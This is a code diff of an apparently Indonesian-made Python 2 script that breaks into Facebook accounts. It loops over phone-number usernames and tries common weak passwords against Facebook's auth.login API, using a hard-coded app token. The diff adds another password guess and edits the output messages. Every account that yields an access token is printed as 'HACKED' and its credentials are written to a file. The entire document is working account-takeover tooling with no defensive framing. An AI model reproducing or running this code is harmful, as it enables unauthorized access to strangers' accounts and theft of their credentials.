@@ -153,13 +153,6 @@ os.system('clear')
 
 logo = """\033[92m
 
-
-
-
-
-
-
-
     ____    ____     ____     ___     __  __    ____    __  ___
    /  _/   / __ )   / __ \   /   |   / / / /   /  _/   /  |/  /
    / /    / __  |  / /_/ /  / /| |  / /_/ /    / /    / /|_/ / 
@@ -318,9 +311,7 @@ def action():
 
             if 'access_token' in q:
 
-                print '\x1b[1;92m|HACKED|\x1b[1;92m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass1
-
-                okb = open('anggaxd/clone.txt', 'a')
+                print '\x1b[1;92m|HACKED| \x1b[1;92m NUMBER| ' + k + c + user + ' \x1b[1;92mPASS| ' + pass1
 
                 okb.write(k + c + user + pass1 + '\n')
 
@@ -338,9 +329,7 @@ def action():
 
                 if 'access_token' in q:
 
-                    print '\x1b[1;92m|HACKED|\x1b[1;92m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass2
-
-                    okb = open('anggaxd/clone.txt', 'a')
+                    print '\x1b[1;92m|HACKED| \x1b[1;92m NUMBER| ' + k + c + user + ' \x1b[1;92mPASS| ' + pass2
 
                     okb.write(k + c + user + pass2 + '\n')
 
@@ -358,9 +347,7 @@ def action():
 
                     if 'access_token' in q:
 
-                        print '\x1b[1;92m|HACKED|\x1b[1;92m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass3
-
-                        okb = open('anggaxd/clone.txt', 'a')
+                        print '\x1b[1;92m|HACKED| \x1b[1;92m NUMBER| ' + k + c + user + ' \x1b[1;92mPASS| ' + pass3
 
                         okb.write(k + c + user + pass3 + '\n')
 
@@ -378,9 +365,7 @@ def action():
 
                         if 'access_token' in q:
 
-                            print '\x1b[1;92m|HACKED|\x1b[1;92m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass4
-
-                            okb = open('anggaxd/clone.txt', 'a')
+                            print '\x1b[1;92m|HACKED| \x1b[1;92m NUMBER| ' + k + c + user + ' \x1b[1;92mPASS| ' + pass4
 
                             okb.write(k + c + user + pass4 + '\n')
 
@@ -398,9 +383,7 @@ def action():
 
                             if 'access_token' in q:
 
-                                print '\x1b[1;92m|HACKED|\x1b[1;92m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass5
-
-                                okb = open('anggaxd/clone.txt', 'a')
+                                print '\x1b[1;92m|HACKED| \x1b[1;92m NUMBER| ' + k + c + user + ' \x1b[1;92mPASS| ' + pass5
 
                                 okb.write(k + c + user + pass5 + '\n')
 
@@ -418,9 +401,7 @@ def action():
 
                                 if 'access_token' in q:
 
-                                    print '\x1b[1;92m|HACKED|\x1b[1;92m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass6
-
-                                    okb = open('anggaxd/clone.txt', 'a')
+                                    print '\x1b[1;92m|HACKED| \x1b[1;92m NUMBER| ' + k + c + user + ' \x1b[1;92mPASS| ' + pass6
 
                                     okb.write(k + c + user + pass6 + '\n')
 
@@ -430,7 +411,7 @@ def action():
 
                                 else:
 
-                                    pass7 = '123454321'
+                                    pass7 = '1234512345'
 
                                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 
@@ -438,9 +419,7 @@ def action():
 
                                     if 'access_token' in q:
 
-                                        print '\x1b[1;92m|HACKED|\x1b[1;92m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass7
-
-                                        okb = open('anggaxd/clone.txt', 'a')
+                                        print '\x1b[1;92m|HACKED| \x1b[1;92m NUMBER| ' + k + c + user + ' \x1b[1;92mPASS| ' + pass7
 
                                         okb.write(k + c + user + pass7 + '\n')
 
@@ -450,7 +429,7 @@ def action():
 
                                     else:
 
-                                        pass8 = user
+                                        pass8 = '123454321'
 
                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 
@@ -458,15 +437,32 @@ def action():
 
                                         if 'access_token' in q:
 
-                                            print '\x1b[1;92m|HACKED|\x1b[1;92m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass8
-
-                                            okb = open('anggaxd/clone.txt', 'a')
+                                            print '\x1b[1;92m|HACKED| \x1b[1;92m NUMBER| ' + k + c + user + ' \x1b[1;92mPASS| ' + pass8                       
 
                                             okb.write(k + c + user + pass8 + '\n')
 
                                             okb.close()
 
                                             oks.append(c + user + pass8)
+                                            
+                                        else:
+                                            
+                                            pass9 = user
+                                            
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            
+                                            q = json.load(data)
+                                            
+                                            if 'access_token' in q:
+                                                
+                                                print '\x1b[1;92m|HACKED| \x1b[1;92m NUMBER| ' + k + c + user + ' \x1b[1;92mPASS| ' + pass9
+                                                
+                                                okb.write(k + c + user + pass9 + '\n')
+                                                
+                                                okb.close()
+                                                
+                                                oks.append(c + user + pass9)
+                         
 
         except:
 
@@ -476,13 +472,7 @@ def action():
 
     p.map(main, id)
 
-    print '\x1b[1;91m--------------------------------------------------'
-
-    print '[\xe2\x9c\x92] HACK TAWAW BW..'
-
-    print '[\xe2\x9c\x92] HAMU HACKED : ' + str(len(oks)) + '/' + str(len(cpb))
-
-    print '[\xe2\x9c\x92] SAVE BU  : anggaxd/clone.txt'
+    print '[\xe2\x9c\x92] TAWAW BW..'
 
     raw_input('\n\x1b[1;92m[\x1b[1;92mBACK\x1b[1;92m]')
 
